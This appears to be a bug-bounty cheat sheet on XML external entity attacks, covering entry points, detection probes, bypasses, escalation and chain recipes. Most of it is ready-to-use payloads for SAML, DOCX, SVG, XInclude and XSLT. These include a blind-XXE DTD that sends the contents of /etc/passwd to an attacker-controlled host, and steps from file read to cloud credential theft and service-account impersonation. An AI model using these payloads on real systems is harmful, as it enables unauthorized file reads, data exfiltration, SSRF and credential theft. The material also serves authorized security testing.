# XXE Deep — every entry point that pays $5K+

> H1: Mail.ru pulse XXE $6K, Open-Xchange Powerpoint blind XXE $2K, Twitter SXMP $0 (still 258 upvotes), and many SAML XXE chains.

---

## ENTRY POINTS

XML hides everywhere:
- SOAP endpoints (`Content-Type: application/soap+xml` or `text/xml`)
- SAML responses (POST body to `/SAML/AssertionConsumerService`)
- RSS/OPML import
- XMP metadata in JPEG/PNG/TIFF (ExifTool / image processors parse XMP as XML)
- DOCX / XLSX / PPTX (ZIP of XML files; parser reads `[Content_Types].xml`, `document.xml`)
- ODF (OpenDocument)
- SVG (XML)
- iWork files (Pages/Keynote/Numbers)
- EPUB
- PDF metadata (XMP)
- Plist (Apple property list, XML variant)
- Sitemap.xml import / sitemap submission
- Webhook bodies that accept XML
- Cookie deserialization (some apps base64+XML)
- XML-RPC endpoints (`/xmlrpc.php` WordPress)

---

## STAGE 1 — Detection

### Probe 1: error oracle
Send malformed XML, watch for parser-revealing errors:
```xml
<?xml version="1.0"?>
<root>&undefined-entity;</root>
```
Errors mentioning `libxml`, `xerces`, `lxml`, `expat`, `dom4j`, `dotnet System.Xml` -> tells you the parser. Crucial because each has different XXE behaviors.

### Probe 2: in-band external entity
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<r>&x;</r>
```
If you see `localhost` or hostname reflected -> classic XXE.

### Probe 3: OOB / blind XXE
When response doesn't reflect entities, use external DTD:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % e SYSTEM "http://your.oast/x.dtd">
  %e;
]>
<r></r>
```
And on your server `x.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://your.oast/?d=%file;'>">
%wrap;
```

Java/PHP parsers often allow this even when in-band reflection is sanitized.

### Probe 4: Parameter entity in DTD only
Some parsers disable general entities but allow parameter entities. Use `%e;` only.

---

## STAGE 2 — Specific entry points

### SAML XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response ...>
  <saml:Issuer>&xxe;</saml:Issuer>
  ...
</samlp:Response>
```
Many SP libraries skip XXE protection. Check after auth response — server may log/parse the XML before signature validation.

### DOCX XXE
1. Make a benign Word doc, save as .docx
2. Unzip: `unzip x.docx -d x/`
3. Edit `word/document.xml`:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE w [<!ENTITY xxe SYSTEM "http://oast/">]>
   <w:document ...>...&xxe;...</w:document>
   ```
4. Re-zip: `cd x; zip -r ../evil.docx .`
5. Upload — server-side conversion (LibreOffice, Apache POI) parses XML

### XLSX XXE
Same pattern. Edit `xl/workbook.xml` or `xl/sharedStrings.xml`.

### SVG XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```
If app converts SVG -> PNG server-side using ImageMagick / Inkscape / rsvg, XXE may fire.

### JPEG XMP XXE
Server-side ExifTool / image processors parse XMP — sometimes vulnerable. Inject a DTD with external entity into the XMP packet of the image, then upload.

### XInclude (when DOCTYPE blocked)
If parser blocks DOCTYPE but supports XInclude:
```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</r>
```

### XSLT (powerful)
If app accepts XSLT, you can read files (`document()`), make HTTP calls (`unparsed-text()`), or with Saxon-PE/EE call Java methods to obtain code execution via extension functions.

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XML-RPC (WordPress)
`POST /xmlrpc.php` with crafted XML, plus `system.multicall` for amplification (DoS).

---

## STAGE 3 — Bypass techniques

### Encoding tricks
Parsers may strip `<!ENTITY` but not handle UTF-16 BOM or quoted entity declarations:
```xml
<?xml version="1.0" encoding="UTF-16"?>
<!-- with BOM 0xFEFF and UTF-16 bytes -->
```

### Local DTD reuse
If outbound HTTP blocked, use a known-existing DTD on the server's filesystem and override an entity inside it:
```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; xxe SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM (some-error-with-content)>">
    %eval;
    %error;
  '>
  %local_dtd;
]>
```
GitHub Synacktiv has full list of usable local DTDs per OS.

### Error-based XXE for blind extraction
Trigger a parser error containing the entity content:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#37; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Error message reveals file content while attempting to parse the bad path.

---

## STAGE 4 — Impact escalation

XXE alone is medium-high. To break $5K+:
- **Read source code / config / private SSH keys / cloud creds** -> chains to other bugs
- **SSRF via XXE**: `<!ENTITY xxe SYSTEM "http://169.254.169.254/...">` -> cloud metadata
- **DoS**: billion laughs, quadratic blowup
- **PHP `expect://` wrapper** for command runs in legacy PHP setups
- **Java JNDI / SchemaLocation** chains to log4j-style remote class loading

---

## CHAIN RECIPES

### Recipe 1 — XXE in DOCX -> file read -> cloud creds -> S3 takeover
1. Upload DOCX with blind XXE
2. Read `/proc/self/environ` -> cloud env vars
3. Test creds, list S3, find source code

### Recipe 2 — SAML XXE on IdP -> read service account key -> impersonate
1. Send malformed SAML response with XXE
2. Server logs raw XML; before signature verify, XML parsed -> file read
3. Read service account JSON key on disk
4. Use creds to call cloud APIs as service account

### Recipe 3 — XSLT in document conversion -> Java method invocation
1. Upload Office file with XSLT processing instruction
2. Conversion server uses Saxon-PE -> XSLT extension functions reach Java method calls
3. Reflectively invoke runtime methods through `<xsl:value-of select="rt:doSomething(...)"/>`

---

## VALIDATION CHECKLIST

- Reproduce in clean session; capture full request + OAST proof
- Show file content read or OAST hit with extracted data
- For SAML XXE: include the entire malformed response, IdP/SP details
- For DOCX/XLSX: include the modified file as PoC attachment

---

## TOOLING

- `XXEinjector` (orange Cyberdefense), `XXExploiter`
- Burp ext: Content-Type Converter (often turn JSON endpoint to XML)
- For SAML: SAML Raider Burp ext
- For DOCX/XLSX: `oletools`, `oxml`
